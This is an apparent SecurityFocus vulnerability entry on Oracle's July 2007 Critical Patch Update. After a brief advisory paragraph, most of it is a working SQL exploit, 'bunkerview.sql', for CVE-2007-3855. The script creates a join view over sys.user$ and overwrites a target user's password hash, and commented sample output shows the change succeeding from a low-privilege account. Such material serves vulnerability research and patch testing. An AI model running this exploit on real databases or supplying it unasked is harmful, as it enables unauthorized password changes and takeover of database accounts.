source: http://www.securityfocus.com/bid/24887/info

Oracle has released a Critical Patch Update advisory for July 2007 to address multiple vulnerabilities for supported releases. Earlier unsupported releases are likely to be affected by these issues as well.

The issues identified by the vendor affect all security properties of the Oracle products and present local and remote threats. Various levels of authorization are needed to leverage some of the issues, but other issues do not require any authorization. The most severe of the vulnerabilities could possibly expose affected computers to complete compromise. 

--
-- bunkerview.sql 
--
-- Oracle 9i/10g - evil view exploit (CVE-2007-3855)
-- Uses evil view to perform unauthorized password update
--
-- by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
-- 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
--
-- This code should be used only for LEGAL purpose!
-- ...and remember: use Oracle at your own risk ;-)
--
-- Thanks to security researchers all around the world...
-- Smarties rules (they know what I mean)! ;-D
--
--
-- SQL> select * from user_sys_privs;
-- 
-- USERNAME                       PRIVILEGE                                ADM
-- ------------------------------ ---------------------------------------- ---
-- TEST                           CREATE VIEW                              NO
-- TEST                           CREATE SESSION                           NO
--
-- SQL> select password from sys.user$ where name='TEST';
--
-- PASSWORD
-- ------------------------------
-- AAAAAAAAAAAAAAAA
-- 
-- SQL> @bunkerview
-- [+] bunkerview.sql - Evil view exploit for Oracle 9i/10g (CVE-2007-3855)
-- [+] by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
-- [+] 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
-- 
-- Target username (default TEST):
-- 
-- View created.
-- 
-- old   1:   update bunkerview set password='6D9FEAAB597EF01B' where name='&the_user'
-- new   1:   update bunkerview set password='6D9FEAAB597EF01B' where name='TEST'
-- 
-- 1 row updated.
-- 
-- 
-- View dropped.
-- 
-- 
-- Commit complete.
-- 
-- SQL> select password from sys.user$ where name='TEST';
-- 
-- PASSWORD
-- ------------------------------
-- 6D9FEAAB597EF01B
--
set serveroutput on;
prompt [+] bunkerview.sql - Evil view exploit for Oracle 9i/10g (CVE-2007-3855)
prompt [+] by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
prompt [+] 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
prompt 
undefine the_user;
accept the_user char prompt 'Target username (default TEST): ' default 'TEST';
create or replace view bunkerview as 
  select x.name,x.password from sys.user$ x left outer join sys.user$ y on x.name=y.name;
  update bunkerview set password='6D9FEAAB597EF01B' where name='&the_user';
  drop view bunkerview;
commit;
